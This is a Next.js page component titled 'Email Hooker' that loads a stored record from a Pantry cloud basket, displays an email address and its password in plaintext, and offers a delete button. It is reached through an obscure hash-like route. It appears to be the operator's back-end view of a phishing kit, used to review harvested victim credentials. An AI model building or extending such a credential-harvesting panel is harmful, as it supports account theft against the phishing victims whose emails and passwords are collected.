import React, { useState } from 'react'
import Link from 'next/link'
import Head from 'next/head'

const Email = (props) => {

    const [isDeleted, setIsDeleted] = useState(false)

    const deleteBasket = () => {


        if (confirm(`Delete "${props.data.Name}" permanently ??`) && !isDeleted) {


            fetch(`https://getpantry.cloud/apiv1/pantry/${process.env.NEXT_PUBLIC_PANTRY_KEY}/basket/${props.data.Name}`, {
                method: 'DELETE',
                headers: {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*',
                    'Access-Control-Allow-Methods': 'POST,PATCH,OPTIONS'
                },
            })
                .then((response) => {
                    console.log(response)

                })
                .catch((error) => {
                    console.error('Error:', error);
                    alert("Server busy. Try again later")

                });

            setIsDeleted(true)



        }

        else {


        }

    }


    return (
        <>

            <Head>
                <title>
                    Email hooker - {props.data.Name}
                </title>
            </Head>


            <nav className="bg-white border-gray-200 px-2 sm:px-4 py-2.5 rounded dark:bg-gray-900">
                <div className="container flex flex-wrap items-center justify-between mx-auto">
                    <Link href="/9W1vw0PcCYNaXV6Pl3K4MgsjXQBsT2Gj" className="flex items-center">
                        <span className="self-center text-xl font-semibold whitespace-nowrap dark:text-white">Email Hooker</span>
                    </Link>

                    <div className="hidden w-full md:block md:w-auto" id="navbar-default">
                        <ul className="flex flex-col p-4 mt-4 border border-gray-100 rounded-lg bg-gray-50 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
                            <li>
                                <Link href="/9W1vw0PcCYNaXV6Pl3K4MgsjXQBsT2Gj" className="block text-xl py-2 pl-3 pr-4 text-white bg-blue-700 rounded md:bg-transparent md:p-0 dark:text-white" >Home</Link>
                            </li>

                        </ul>
                    </div>
                </div>
            </nav>

            <div className="relative overflow-x-auto md:m-8 m-1">
                <div className="w-full text-sm text-left text-gray-500 dark:text-gray-400">
                    <div>
                        <div className={`bg-white border-b dark:bg-gray-800 dark:border-gray-700 flex flex-col ${isDeleted ? 'hidden' : 'block'}`} >
                            <div scope="row" className="px-6 py-4 ">
                                <p className='font-medium text-gray-900 whitespace-nowrap dark:text-white underline underline-offset-2' >Basket Name</p>
                                <p>{props.data.Name}</p>
                            </div>
                            <div className="px-6 py-4">
                                <p className='font-medium text-gray-900 whitespace-nowrap dark:text-white underline underline-offset-2' >Email</p>
                                <p>{props.data.Email}</p>
                            </div>
                            <div className="px-6 py-4">
                                <p className='font-medium text-gray-900 whitespace-nowrap dark:text-white underline underline-offset-2' >Password</p>
                                <p>{props.data.Pass}</p>
                            </div>

                        </div>
                        <div className="w-full flex justify-between p-4 dark:bg-gray-800 dark:border-gray-700">

                            <Link href="/9W1vw0PcCYNaXV6Pl3K4MgsjXQBsT2Gj">
                                <button type="button" className="focus:outline-none text-white bg-green-700 hover:bg-green-800 focus:ring-4 focus:ring-green-300 font-medium rounded-[4px] text-sm px-7 py-2.5 ">
                                    Back
                                </button>
                            </Link>
                            <div onClick={deleteBasket}>

                                <button type="button" className="focus:outline-none text-white bg-red-700 hover:bg-red-800 focus:ring-4 focus:ring-red-300 font-medium rounded-[4px] text-sm px-7 py-2.5 ">Delete</button>
                            </div>
                        </div>

                    </div>

                </div>
            </div>

        </>
    )
}


export async function getServerSideProps(context) {

    const { pid } = context.query

    const res = await fetch(`https://getpantry.cloud/apiv1/pantry/${process.env.NEXT_PUBLIC_PANTRY_KEY}/basket/${pid}`)
    const data = await res.json()
    return {
        props: { data }, // will be passed to the page component as props
    }
}

export default Email